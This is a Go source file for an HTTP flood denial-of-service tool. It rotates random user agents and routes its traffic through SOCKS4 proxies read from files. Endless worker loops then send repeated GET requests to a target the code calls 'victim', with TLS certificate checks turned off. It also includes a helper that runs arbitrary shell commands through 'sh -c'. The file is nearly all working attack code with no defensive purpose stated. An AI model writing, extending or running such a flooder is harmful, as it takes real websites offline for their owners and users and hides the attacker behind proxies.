package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/exec"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/gamexg/proxyclient"
)

// Returns an array of User-agent
func getUserAgents(number int) []string {
	ua := make([]string, number)

	for i := range ua {
		ua[i] = browser.Random()
	}

	return ua
}

// Returns a random element in the []string
func random(seeds []string) string {
	return seeds[rand.Intn(len(seeds))]
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}

	return string(s)
}

func randomParam() string {
	return fmt.Sprintf("?%s=%s", randomString(5), randomString(1000))
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func flood(host, useragent, proxy string, n int) {
	var conn net.Conn

	victim, err := url.Parse(host)
	if err != nil {
		return
	}

	header := []byte("GET / HTTP/1.1\r\n" +
		"Host: " + victim.Hostname() + "\r\n" +
		"User-Agent: " + useragent + "\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n")

	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
	if err != nil {
		return
	}

	port := "80"
	if victim.Scheme == "https" {
		port = "443"
	}

	conn, err = dialer.DialTimeout("tcp", victim.Hostname()+":"+port, 5*time.Second)
	if err != nil {
		return
	}

	if port == "443" {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
		})
	}

	defer conn.Close()
	for i := 0; i < n; i++ {
		conn.Write(header)
	}
}

func worker(host string, useragents, proxies []string) {
	for {
		flood(host, random(useragents), random(proxies), 100)
	}
}

func runCommand(command string) {
	exec.Command("sh", "-c", command).Run()
}
